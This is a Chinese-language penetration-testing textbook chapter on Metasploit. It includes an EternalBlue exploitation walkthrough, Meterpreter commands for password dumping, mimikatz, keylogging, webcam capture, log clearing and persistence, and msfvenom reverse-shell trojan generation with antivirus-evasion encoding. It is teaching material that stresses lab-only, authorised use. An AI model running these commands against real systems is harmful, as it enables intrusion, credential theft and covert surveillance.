# 第七章 系统漏洞利用 —— Metasploit 从入门到精通

> 第7章 | 预计学习时间：6小时 | 难度：⭐⭐⭐⭐

---

## 📖 写在前面

前面两章我们讲了Web应用渗透测试，
这一章我们换个话题——
系统漏洞利用。

什么是系统漏洞利用？
简单说就是：
**找到操作系统或者系统服务的漏洞，
然后利用这个漏洞，
获取系统的权限。**

比如经典的MS08-067、MS17-010（永恒之蓝），
都是系统漏洞。
找到有漏洞的机器，
用对应的 exploit 一打，
直接就拿到权限了。

讲系统漏洞利用，
就不能不讲**Metasploit**。
这是漏洞利用框架中的神器，
渗透测试工程师的必备武器。
Kali Linux里自带的，
功能非常强大。

这一章我们就来讲讲Metasploit，
从基础概念到常用操作，
从信息收集到漏洞利用再到后渗透，
带你入门这个强大的工具。

坐稳了，开唠。

---

## 7.1 先讲一个故事

### 7.1.1 "永恒之蓝"的威力

先给你讲一个真实的故事。

2017年，
有个勒索病毒叫"WannaCry"，
在全球大爆发，
感染了几十万台电脑，
包括很多企业、政府机构、医院，
损失惨重。

这个病毒是怎么传播的？
利用的就是一个叫**MS17-010**（永恒之蓝）的Windows漏洞。
这个漏洞是在Windows的SMB服务里的，
危害特别大——
只要445端口开着，
系统没打补丁，
一发payload过去，
直接就能拿到系统权限，
不需要任何交互。

有多厉害？
当时很多机构的内网，
一台中招，
整个内网很快就全部沦陷了。
因为445端口在内网基本都是通的，
一台传一台，
跟传染病一样。

当时很多安全从业者，
用Metasploit里的MS17-010模块，
测试内网的机器，
一扫一大片，
一打一个准。
很多企业的内网，
一半以上的机器都有这个漏洞。

一个漏洞，
加上一个工具，
就能打穿整个内网。
这就是系统漏洞利用的威力。

---

当然，
MS17-010是很多年前的事了，
现在新机器基本都打了补丁。
但新的系统漏洞一直在出，
每年都有各种高危的系统漏洞被发现。
作为渗透测试工程师，
系统漏洞利用是必修课。

而Metasploit，
就是做这个最好用的工具之一。

这一章，
我们就来好好聊聊Metasploit。

---

## 7.2 Metasploit 是什么？

先介绍一下Metasploit。

### 7.2.1 Metasploit 简介

Metasploit是什么？
官方一点说：
Metasploit是一个开源的渗透测试框架，
它提供了各种漏洞利用、
Payload生成、
后渗透测试等功能，
是渗透测试工程师最常用的工具之一。

用人话说就是：
**Metasploit是一个漏洞利用的军火库，
里面有各种现成的漏洞利用代码，
还有各种Payload、辅助工具，
你只要找到有漏洞的目标，
选对模块，设好参数，
点一下运行，
就能打进去。**

就这么简单粗暴。

Metasploit有多厉害？
- 几百个漏洞利用模块（exploit）
- 几十个Payload
- 一堆辅助模块（扫描、爆破、信息收集...）
- 强大的后渗透功能（Meterpreter）
- 可以自己写模块扩展
- ......

基本上，
渗透测试的各个环节，
Metasploit都能覆盖。

Metasploit有几个版本：
- **社区版（Framework）**：开源免费，功能最全，Kali里自带的就是这个
- **Pro版**：商业版，有图形界面、自动化渗透、报告等高级功能
- **还有Express版什么的**，不常用

我们一般说Metasploit，
指的就是开源的Framework版本。
Kali里已经预装好了，
直接就能用。

### 7.2.2 Metasploit的基本概念

在开始用之前，
先搞清楚几个基本概念，
不然后面会懵。

```
核心概念：

  1. Exploit（漏洞利用模块）
     • 就是利用某个漏洞的代码
     • 每个漏洞对应一个exploit模块
     • 比如 exploit/windows/smb/ms17_010_eternalblue
       就是利用MS17-010漏洞的模块
     • 相当于"子弹"，打特定的目标

  2. Payload（载荷/有效载荷）
     • 就是打进去之后要执行的代码/功能
     • 比如：
       - 反弹一个shell回来
       - 执行一条命令
       - 添加一个用户
       - 等等
     • 相当于"弹头"，打中了之后要干什么

  3. Auxiliary（辅助模块）
     • 不直接拿权限，但是有用的辅助功能
     • 比如：
       - 端口扫描
       - 漏洞扫描
       - 暴力破解
       - 信息收集
       - 等等
     • 相当于"工具"，各种辅助功能

  4. Post（后渗透模块）
     • 拿到权限之后，进一步操作的模块
     • 比如：
       - 抓密码
       - 提权
       - 横向移动
       - 信息收集
       - 等等
     • 打进去之后用的

  5. Meterpreter
     • Metasploit最牛逼的Payload之一
     • 一个功能极其强大的后渗透Shell
     • 上传下载、执行命令、抓密码、
       截屏幕、开摄像头、提权、横向移动...
       啥都能干
     • 是Metasploit的招牌功能

  6. Encoder（编码器）
     • 用来给Payload编码/加密
     • 绕过杀毒软件的检测
     • 相当于"隐身衣"
```

把这几个概念搞清楚，
后面就好学了。
简单说就是：
- 用Auxiliary做信息收集、扫描
- 找到漏洞了，用Exploit + Payload去打
- 打进去了，用Meterpreter + Post模块做后渗透

就这么个流程。

---

## 7.3 Metasploit 快速上手

讲完概念，
我们来动手试试。
Kali里已经装好了Metasploit，
直接就能用。

### 7.3.1 启动

怎么启动？
打开终端，输入：

```bash
msfconsole
```

等一会儿，
就进入Metasploit的控制台了。
进去之后是 `msf6 >` 这样的提示符。

第一次启动可能会慢一点，
要加载各种模块。
等它加载完。

### 7.3.2 基本命令

先熟悉几个最基本的命令。

```
常用基础命令：

  help                查看帮助
  ?                   跟help一样
  search 关键词        搜索模块
  use 模块名           使用某个模块
  info                查看当前模块的信息
  show options        查看模块需要配置的参数
  set 参数名 值       设置参数
  unset 参数名        取消设置
  check               检查目标是否存在漏洞（不是所有模块都有）
  run / exploit       运行模块/发起攻击
  back                返回上一级
  sessions            查看当前的会话（打进去的目标）
  sessions -i 编号    进入某个会话
  background / Ctrl+Z  把当前会话放到后台
  exit / quit         退出
```

不用死记硬背，
用多了自然就记住了。
先有个印象。

### 7.3.3 搜索模块

Metasploit模块太多了，
怎么找你想要的模块？
用 `search` 命令。

```
例子：

  search ms17-010        搜索MS17-010相关的模块
  search mysql           搜索MySQL相关的模块
  search type:exploit    只搜索exploit模块
  search type:auxiliary  只搜索辅助模块
  search platform:windows  只搜Windows平台的
```

搜索出来会列一堆模块，
每个模块有名字、等级、描述。
找到你想要的，
记住名字，
然后 `use` 它。

### 7.3.4 使用模块的一般流程

用一个模块的一般流程是：

```
  1. 搜索模块
     search xxx

  2. 使用模块
     use 模块路径

  3. 查看需要设置的参数
     show options

  4. 设置参数
     set RHOSTS 目标IP
     set RPORT 目标端口
     set PAYLOAD 用什么payload
     ...该设的都设上

  5. 检查（可选）
     check
     看看目标有没有漏洞

  6. 运行
     run
     或者 exploit
```

就这么几步，
基本所有模块都是这个套路。

---

## 7.4 常用辅助模块

讲完基础操作，
先讲几个常用的辅助模块。
辅助模块就是不直接拿shell，
但是用来做信息收集、扫描、爆破这些的。

### 7.4.1 端口扫描

Metasploit里也有端口扫描的辅助模块，
不用Nmap也能扫。

```
常用的端口扫描模块：

  auxiliary/scanner/portscan/tcp    TCP端口扫描

用法：
  use auxiliary/scanner/portscan/tcp
  set RHOSTS 目标IP/网段
  set PORTS 端口范围
  run
```

当然，
端口扫描还是Nmap更好用。
Metasploit里也能直接调用Nmap：

```
db_nmap 参数 目标

比如：
  db_nmap -sV 目标IP
```

结果会自动存到数据库里。

### 7.4.2 漏洞扫描/验证

很多辅助模块是用来检测某个漏洞是否存在的。

比如：
```
auxiliary/scanner/smb/smb_ms17_010   检测MS17-010漏洞
auxiliary/scanner/rdp/rdp_scanner   扫RDP
auxiliary/scanner/ftp/ftp_version   扫FTP版本
......
```

看到一个漏洞，
先拿辅助模块扫一下，
看看目标有没有这个洞，
有了再拿exploit去打。

### 7.4.3 暴力破解

Metasploit里也有各种暴力破解的模块。

```
常见的爆破模块：

  auxiliary/scanner/ssh/ssh_login         SSH爆破
  auxiliary/scanner/ftp/ftp_login         FTP爆破
  auxiliary/scanner/mysql/mysql_login     MySQL爆破
  auxiliary/scanner/smb/smb_login         SMB爆破
  auxiliary/scanner/http/http_login       HTTP认证爆破
  ......太多了
```

用法都差不多：
设目标、设用户名/字典、设密码/字典、run。

当然，
爆破Hydra可能更好用，
后面讲密码攻击的时候会讲。
但Metasploit里集成了，
用着也方便。

---

## 7.5 漏洞利用（Exploit）

辅助模块是铺垫，
真正的杀招是Exploit模块——
漏洞利用。

### 7.5.1 一次完整的漏洞利用演示

光说不练假把式，
我们用MS17-010举个例子，
看看一次完整的漏洞利用是什么流程。
（当然你得有个有漏洞的靶机才能试，
比如Windows 7没打补丁的。）

```
步骤：

  1. 进入msfconsole
     msfconsole

  2. 搜索MS17-010的模块
     search ms17-010
     会出来好几个，其中有：
       exploit/windows/smb/ms17_010_eternalblue
     这个就是利用模块

  3. 使用这个模块
     use exploit/windows/smb/ms17_010_eternalblue

  4. 看看要设什么参数
     show options
     主要就是 RHOSTS（目标IP）必须设

  5. 设置目标IP
     set RHOSTS 192.168.1.100

  6. 选择Payload（一般默认的就行）
     可以用默认的，也可以自己设
     比如：
     set PAYLOAD windows/x64/meterpreter/reverse_tcp
     设好你自己的IP和端口
     set LHOST 你的IP
     set LPORT 4444

  7. 开打
     exploit

  8. 如果成功，会返回一个Meterpreter会话
     然后你就可以在Meterpreter里为所欲为了
```

就是这么个流程。
当然，
真实环境中没这么简单，
目标可能有防护、有补丁，
不是一打就中的。
但基本流程就是这样的。

### 7.5.2 Payload 是什么？怎么选？

前面提到了Payload，
很多新手搞不清楚Payload是什么、怎么选。

简单说，
Payload就是**打进去之后要执行什么**。

```
常见的Payload类型：

  1. 绑定Shell（Bind Shell）
     • 在目标机器上开个端口等你连
     • 缺点：目标有防火墙就不好使了

  2. 反弹Shell（Reverse Shell）
     • 目标主动连回你的机器
     • 最常用，因为防火墙一般拦往外连
       比拦进来的松
     • 推荐用这个

  3. Meterpreter
     • Metasploit的招牌Payload
     • 功能超级强大的Shell
     • 啥都能干
     • 后渗透基本都用这个

  4. 执行命令/添加用户等
     • 就执行一条命令、加个用户
     • 简单的任务用这个
     • 不需要交互shell
```

一般来说，
不知道用什么Payload的时候，
选 `windows/meterpreter/reverse_tcp` 就对了。
（根据目标系统和架构选对应的）

### 7.5.3 常用的经典漏洞

Metasploit里有几百个exploit，
记不住也没关系。
但几个经典的、有名的，
最好还是知道。

```
几个经典的Windows漏洞：

  • MS08-067 —— 老经典了，Windows XP/2003时代的神器
  • MS17-010（永恒之蓝）—— 这个大家都知道，太有名了
  • MS12-020 —— RDP漏洞，蓝屏也能利用
  • BlueKeep（CVE-2019-0708）—— 也是RDP的漏洞
  • PrintNightmare —— 打印池服务的漏洞，近几年的
  • 还有很多很多...
```

Linux也有，
不过相对少一点，
而且Linux的配置差异大，
利用起来没Windows那么统一。

当然，
这些都是老漏洞了，
新机器基本都打了补丁。
但在实战中，
老系统多的是，
这些经典漏洞经常能用上。

---

## 7.6 Meterpreter 后渗透

最激动人心的部分来了——
Meterpreter。

如果你成功打进去了，
而且用的是Meterpreter的Payload，
那你就得到了一个Meterpreter会话。
Meterpreter有多强？
可以说，
只有你想不到，没有它做不到的。

### 7.6.1 Meterpreter 基础命令

先看看Meterpreter里常用的命令。

```
基础命令：
  help              帮助
  background        放到后台（或者Ctrl+Z）
  exit              退出会话

  sysinfo           查看系统信息
  getuid            查看当前用户
  getpid            查看当前进程ID
  ps                列出进程
  pwd               看当前目录
  ls                列文件
  cd 目录           切换目录
  cat 文件          查看文件内容
```

```
文件操作：
  upload 本地文件 目标路径     上传文件
  download 目标文件 本地路径   下载文件
  rm 文件                      删除文件
  mkdir 目录名                 新建目录
  edit 文件                   编辑文件
```

```
系统操作：
  execute -f cmd.exe           执行程序
  shell                        获得一个系统Shell
  reboot                       重启
  shutdown                     关机
```

这些是最基础的，
先混个眼熟。

### 7.6.2 信息收集类

打进去之后，
先收集信息，
看看这台机器是什么情况。

```
常用的信息收集命令/模块：

  sysinfo             系统信息
  ipconfig / ifconfig  网卡信息
  route               路由表
  getuid              当前用户
  hashdump            抓密码哈希（需要SYSTEM权限）
  run post/windows/gather/checkvm   检查是不是虚拟机
  run post/windows/gather/enum_applications  枚举安装的软件
  run post/windows/gather/wmic_command  执行wmic命令
  ......还有很多gather模块
```

先搞清楚目标是什么系统、
什么权限、什么环境，
再决定下一步干什么。

### 7.6.3 提权

打进去之后，
如果权限不够高（比如是普通用户权限），
那就需要提权——
把权限提升到管理员/SYSTEM。

Meterpreter里提权很方便。

```
提权的方法：

  1. getsystem
     • Meterpreter内置的提权命令
     • 有几种提权方法，自动试
     • 运气好的话直接就提上去了
     • 最简单的方法

  2. 用本地提权漏洞
     • 系统有什么本地提权漏洞
     • 用对应的exploit模块打
     • 比如MS16-032、CVE-2021-40449之类的
     • 看系统补丁情况

  3. 烂土豆（Rotten Potato）系列
     • 一种经典的提权手法
     • 从服务账号提权到SYSTEM
     • Metasploit里有对应的模块
     • 很好用

  4. 还有很多其他方法
     • 看具体情况
```

提权是后渗透里很重要的一步，
权限越高，
能干的事越多。
目标是拿到最高权限（Windows的SYSTEM，Linux的root）。

### 7.6.4 抓密码

拿到高权限之后，
很多人第一个想到的就是——
**抓密码**。

Meterpreter抓密码也很方便。

```
常见的抓密码方法：

  1. hashdump
     • 抓取SAM里的密码哈希
     • 需要SYSTEM权限
     • 拿到哈希可以离线破解
     • 也可以用哈希传递（Pass-the-Hash）横向移动

  2. mimikatz
     • 神器中的神器
     • 能抓明文密码
     • Metasploit里可以加载mimikatz模块
     • 命令：load mimikatz
     • 然后：wdigest、kerberos...
     • 能抓各种密码

  3. 其他模块
     • run post/windows/gather/credentials/xxx
     • 还有很多专门抓各种密码的模块
     • 浏览器密码、WiFi密码、各种客户端密码...
```

密码抓到手，
横向移动就好办了。
很多人密码都是复用的，
拿到一个密码，
可能能登好多台机器。

### 7.6.5 其他好用的功能

Meterpreter的功能太多了，
再给你介绍几个好用的。

```
  screenshot        截屏幕
  webcam_list       列摄像头
  webcam_snap       用摄像头拍张照
  keyscan_start     开始键盘记录
  keyscan_dump      导出键盘记录
  keyscan_stop      停止键盘记录
  clearev           清除日志（擦屁股）
  getgui            开远程桌面
  run persistence   安装持久化后门
  ......还有很多很多
```

功能太多了，
讲不完。
你可以自己 `help` 看看，
慢慢研究。

### 7.6.6 横向移动

在一台机器上待够了，
想去内网其他机器看看？
那就要横向移动了。

Meterpreter里也能做横向移动。
最经典的就是**PsExec**和**Pass-the-Hash**。

```
常用的横向移动方法：

  1. psexec
     • 拿到账号密码或者哈希之后
     • 用psexec模块打其他机器
     • 前提是目标开了445，且有管理员权限
     • 非常经典的横向移动方法

  2. Pass-the-Hash（哈希传递）
     • 不用破解密码明文
     • 直接用哈希就能登录
     • 内网渗透神器

  3. 其他方法
     • WMI
     • WinRM
     • RDP
     • SSH
     • ......
```

横向移动是内网渗透的核心，
我们后面讲内网渗透的时候会详细讲。
这里先知道Meterpreter里也能做就行。

---

## 7.7 MSFvenom —— Payload生成神器

Metasploit还有一个很重要的工具，
叫 **MSFvenom**。
它是用来生成Payload的。

什么时候用？
比如：
- 你想生成一个木马程序，骗受害者运行
- 你想生成一个Shellcode，用来 exploit 开发
- 你想给Payload编码免杀
- 等等

MSFvenom把原来的msfpayload和msfencode整合在一起了，
专门用来生成各种Payload。

### 7.7.1 基础用法

MSFvenom的基本用法：

```bash
msfvenom -p 载荷名 LHOST=你的IP LPORT=端口 -f 格式 -o 输出文件名
```

举几个例子。

```
例子1：生成一个Windows的Meterpreter反弹木马（exe）

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o payload.exe

解释：
  -p windows/meterpreter/reverse_tcp   用什么Payload
  LHOST=192.168.1.1                   你的IP（反弹连回来的地址）
  LPORT=4444                          你的端口
  -f exe                              输出格式是exe
  -o payload.exe                      输出到payload.exe

然后在MSF里开监听：
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  run

  然后把生成的exe想办法让目标运行
  运行之后你这边就能收到Meterpreter会话了
```

```
例子2：生成Linux的反弹Shell

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell.elf
```

```
例子3：生成PHP的一句话/Payload

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw
```

```
例子4：生成Java的Payload

msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f jar -o shell.jar
```

格式支持的很多，
exe、dll、elf、python、php、java、apk、
powershell、bash、c、raw...
基本你能想到的都支持。

### 7.7.2 编码/免杀

生成的Payload直接拿去用，
很容易被杀毒软件查杀。
怎么办？
可以用编码器编码一下，
增加免杀的概率。

怎么编码？
加 `-e 编码器` 参数。

```
查看有哪些编码器：
  msfvenom -l encoders

常用的：
  x86/shikata_ga_nai   很有名的编码器，多态编码，效果不错
  x64/xor             XOR编码
  还有很多...

用法：
  msfvenom -p xxx -e x86/shikata_ga_nai -i 10 ...

  -i 10 是编码10次，编码次数越多越难杀
  但也不是越多越好，太多了反而容易被检测
  一般几次到十几次就行
```

当然，
现在杀毒软件都很厉害，
光靠MSFvenom的编码器，
免杀效果有限。
真正的免杀要复杂得多，
这里只是入门。

记住，
学习研究可以，
别拿去做违法的事。

---

## 7.8 Metasploit数据库

Metasploit还带了个数据库功能，
可以把扫描结果、收集到的信息、
主机、服务、漏洞...
都存在数据库里，
方便查看和管理。

Kali里一般都配置好了，
进msfconsole之后：

```
db_status    查看数据库状态
db_nmap      用nmap扫描，结果自动入库
hosts        查看所有主机
services     查看所有服务
vulns        查看发现的漏洞
creds        查看找到的凭据
loot         查看收集到的战利品
```

有了数据库，
管理目标就方便多了。
尤其是目标多的时候，
不用自己记笔记了。

---

## 7.9 给新手的几个建议

最后，给新手几个建议。

### 建议一：先搞懂原理，再玩工具

Metasploit很强大，
也很容易上手，
点几下就能打shell。
但别满足于只会用工具。
- 这个漏洞是什么原理？
- Payload是怎么工作的？
- 为什么能打进去？
- 打进去之后为什么能拿到权限？

这些原理搞懂了，
你才真的学会了。
不然就只是个"脚本小子"，
换个环境就不会了。

### 建议二：多搭靶机练手

光看没用，
要动手练。
怎么练？
搭靶机！

Windows XP、Windows 7、Windows Server 2003/2008...
找一些有漏洞的镜像，
不打补丁，
搭成靶机，
然后用Metasploit去打。

比如经典的MS17-010、MS08-067，
找个老系统来练，
打成功了会很有成就感，
也能加深理解。

也可以去VulnHub、Hack The Box这些平台，
上面有很多靶机，
专门用来练手的。

### 建议三：别死记硬背，多查help

Metasploit模块太多了，
命令也多，
没人能全记住。
没关系，
忘了就 `help`，
不知道用什么模块就 `search`，
想知道参数就 `show options`。
查多了自然就记住了。

### 建议四：合法使用，别瞎搞

最后再强调一遍，
Metasploit很强大，
但也很危险。
**没有授权，
绝对不要去碰别人的系统。**

拿自己的靶机练手没问题，
打授权的目标也没问题。
但别手贱去扫别人、打别人，
犯法的。

技术越强大，
责任越大。
用对地方。

---

## 7.10 本章总结

这一章我们讲了Metasploit和系统漏洞利用，
内容比较多，总结一下：

**Metasploit是什么：**
- 开源的渗透测试框架，漏洞利用的军火库
- Kali自带，功能强大

**核心概念：**
- Exploit：漏洞利用模块（子弹）
- Payload：载荷/有效载荷（弹头）
- Auxiliary：辅助模块（工具）
- Post：后渗透模块（打进去之后用）
- Meterpreter：功能强大的后渗透Shell
- Encoder：编码器（免杀用）

**基本使用流程：**
搜索模块 → use模块 → 配置参数 → 运行

**常用辅助模块：**
- 端口扫描、漏洞扫描、暴力破解...

**漏洞利用：**
- 选exploit → 设参数 → 选payload → exploit
- 经典漏洞：MS08-067、MS17-010...

**Meterpreter（重点！）：**
- 基础命令、文件操作
- 信息收集
- 提权（getsystem、本地漏洞、烂土豆...）
- 抓密码（hashdump、mimikatz...）
- 截图、键盘记录、摄像头...
- 横向移动

**MSFvenom：**
- 生成各种格式的Payload
- 支持各种平台、各种格式
- 编码/免杀

**数据库：**
- 存储主机、服务、漏洞、凭据...
- 方便管理

最后送你一句话：

> **Metasploit是神器，
> 但真正厉害的不是工具，
> 是使用工具的人。**

---

## 下一章预告

下一章我们讲**第8章 密码攻击**——
密码爆破怎么做？
Hydra怎么用？
Hashcat怎么跑哈希？
社工字典怎么生成？
无线网络密码怎么破？

精彩内容，我们下章见！👋

---

> 💡 **本章小思考**
>
> 看完这一章，动手试试吧！
>
> 搭一个有漏洞的Windows靶机（比如Win7没打补丁的），
> 试着用MS17-010打一打，
> 成功拿到Meterpreter之后，
> 试试各种命令：
> - 抓密码
> - 提权
> - 截图
> - 键盘记录
>
> 自己动手做一遍，
> 比看十遍书印象都深。
>
> （一定用自己的靶机啊！别瞎搞！）
